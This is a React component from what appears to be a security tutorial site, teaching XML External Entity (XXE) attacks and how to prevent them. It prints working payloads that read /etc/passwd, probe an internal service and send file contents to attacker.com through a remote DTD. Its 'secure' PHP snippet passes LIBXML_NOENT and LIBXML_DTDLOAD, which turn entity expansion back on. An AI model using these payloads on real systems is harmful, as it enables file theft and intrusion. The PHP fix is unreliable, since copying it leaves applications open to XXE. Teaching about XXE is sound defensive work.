
import React from 'react';
import { File } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const XXE: React.FC = () => {
  return (
    <section id="xxe" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">XML External Entity (XXE)</h3>
      <p className="mb-6">
        XML External Entity (XXE) attacks occur when an application processes XML from untrusted sources without
        properly disabling external entity references. Attackers can exploit vulnerable XML processors to access
        local files, perform server-side request forgery, conduct internal port scanning, or in some cases, execute
        remote code. This vulnerability is particularly dangerous in legacy systems or applications that process XML data.
      </p>
      
      <h4 className="text-xl font-semibold mt-6 mb-3">Types of XXE Attacks</h4>
      <ul className="list-disc pl-6 space-y-2 mb-4">
        <li><strong>Classic XXE:</strong> Exploiting XML parsers to access local files</li>
        <li><strong>Blind XXE:</strong> No direct output, but can extract data via out-of-band techniques</li>
        <li><strong>Error-based XXE:</strong> Causing errors to reveal sensitive information</li>
        <li><strong>XInclude attacks:</strong> Using XInclude tags to include other files</li>
        <li><strong>SOAP-based XXE:</strong> Exploiting vulnerabilities in SOAP web services</li>
      </ul>
      
      <h4 className="text-xl font-semibold mt-6 mb-3">Example Attack</h4>
      <CodeExample 
        language="xml" 
        isVulnerable={true}
        title="Malicious XXE Payload" 
        code={`<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>

<!-- When processed, this XML will try to read /etc/passwd and include its contents
     in the lastName field, potentially revealing sensitive system information -->
     
<!-- Another example - SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-service:8080/api/admin">
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&xxe;</lastName>
</userInfo>

<!-- This payload attempts to access an internal service that might not be 
     directly accessible from outside the network -->
     
<!-- Example of blind XXE with data exfiltration -->
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<userInfo>
  <firstName>John</firstName>
  <lastName>Doe</lastName>
</userInfo>

<!-- Contents of evil.dtd on attacker's server -->
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?data=%file;'>">
%all;
%exfil;`} 
      />
      
      <CodeExample 
        language="javascript" 
        isVulnerable={false}
        title="Secure XML Processing" 
        code={`// Disable XXE in Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// Disable XXE in PHP
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

// Disable XXE in .NET
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);

// Disable XXE in Python with lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False)
document = etree.parse(xmlfile, parser)

// Disable XXE in Node.js
const libxmljs = require('libxmljs');
const xml = libxmljs.parseXml(xmlString, { 
  noent: false, 
  dtdload: false,
  dtdvalid: false
});

// Best practice: Consider using alternative formats like JSON
// if XML processing is not strictly necessary`} 
      />
      
      <h4 className="text-xl font-semibold mt-6 mb-3">XXE Prevention Checklist</h4>
      <ul className="list-disc pl-6 space-y-2">
        <li>Disable DTDs (Document Type Definitions) completely when possible</li>
        <li>Disable external entity resolution in all XML parsers</li>
        <li>Use less complex data formats like JSON where applicable</li>
        <li>Patch or upgrade XML processors and libraries</li>
        <li>Implement server-side input validation, sanitization, and filtering</li>
        <li>Verify that XML processors are correctly configured in all environments (dev, test, prod)</li>
        <li>Use web application firewalls (WAFs) as an additional layer of protection</li>
      </ul>
    </section>
  );
};

export default XXE;
